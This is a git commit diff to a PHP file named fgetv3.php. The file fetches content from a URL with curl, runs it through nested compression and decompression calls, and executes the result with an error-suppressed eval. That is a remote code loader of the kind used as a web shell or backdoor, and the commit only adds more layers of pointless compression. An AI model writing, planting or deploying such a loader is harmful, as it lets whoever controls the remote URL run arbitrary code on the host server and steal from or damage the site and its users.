d61b4bde1cd972c92b53c64c3adcdc7ff97dc6aa
Haikal Siregar <mininginformation1337@gmail.com>
2024-08-02 01:55:43 +0700

    Update fgetv3.php

--- fgetv3.php
+++ fgetv3.php
@@ -13,8 +13,8 @@ function fetchContent($url) {
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
     $content = curl_exec($curl);
     curl_close($curl);
-    return gzdeflate(gzcompress(gzdeflate(gzcompress($content))));
+    return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($content))))))));
 }
-$content = gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url)))));
+$content = gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url)))))))));
 @eval("?>".$content);
 ?>
